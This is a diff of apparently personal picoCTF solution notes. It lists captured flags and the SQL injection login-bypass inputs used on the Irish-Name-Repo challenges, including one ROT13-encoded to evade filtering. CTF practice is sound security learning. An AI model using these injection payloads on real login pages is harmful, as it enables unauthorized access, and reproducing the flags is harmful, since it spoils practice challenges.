@@ -38,4 +38,13 @@
 --------
 01101110 -> n
 
-11. Client-side-again -> 
+11. Client-side-again -> picoCTF{not_this_again_4daf93}
+12. Irish-Name-Repo 2 -> picoCTF{m0R3_SQL_plz_8c334129}
+    1.  username=admin' OR'1'='1&password=password123&debug=0 -> not working
+    2.  username=admin'--&password=anything&debug=0
+
+13. Irish-Name-Repo 3 -> picoCTF{3v3n_m0r3_SQL_2af58a67} 
+    1. SQL injection but ROT 13 the injection since it gets changed before read by SQL:   
+       1. password=' BE 1=1--&debug=1   because BE = OR with ROT13
+
+14. 
